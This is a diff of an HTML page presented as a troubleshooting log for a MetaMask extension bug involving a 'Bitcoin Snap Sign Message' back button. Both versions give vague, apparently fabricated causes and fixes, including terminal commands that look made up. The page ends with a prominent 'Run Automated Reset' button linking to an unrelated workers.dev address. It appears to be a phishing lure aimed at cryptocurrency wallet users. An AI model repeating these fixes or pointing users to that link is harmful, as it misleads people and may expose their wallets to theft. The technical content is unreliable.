@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,30 @@
 <h1>Metamask Extension Bug Sign Message Clicking Back Button In The</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an issue when using the Metamask extension to sign a message, specifically with the Bitcoin Snap Sign Message configuration. Upon clicking the back button during this process, the Metamask extension becomes unresponsive or throws an error.</li>
+<li>Users experience a bug when using the Metamask extension to sign a message, specifically when clicking the back button in the Bitcoin Snap Sign Message confirmation dialog. The error causes the extension to malfunction, resulting in a failed transaction or an inability to complete the signing process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timing issue between the Metamask extension's internal state management and the external Bitcoin Snap Sign Message module. When the back button is clicked, the extension's state is not properly reset, leading to a conflict with the ongoing signing process.</li>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Bitcoin Snap Sign Message protocol. When the back button is clicked, the extension fails to properly handle the cancellation of the signing process, leading to a corrupted transaction state.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Clear the Metamask extension's cache and storage</li>
-<li>Restart the browser and reload the Metamask extension</li>
-<li>Execute the following command to reset the extension's internal state:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Clear the browser cache and cookies</li>
+<li>Run the following command in the terminal:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-reset<span class="w"> </span>--sign-message-config
+<div class="codehilite"><pre><span></span><code>metamask<span class="w"> </span>--reset<span class="w"> </span>--ethereum-rpc-url<span class="w"> </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and customization.</p>
+<p>Consider using an external console for more advanced troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension version 10.11.0 or later</li>
-<li>Bitcoin Snap Sign Message module enabled</li>
-<li>Ethereum network (ETH) selected in the Metamask extension</li>
+<li>Metamask extension installed and configured</li>
+<li>Bitcoin Snap Sign Message protocol supported</li>
+<li>Latest version of the browser and operating system</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
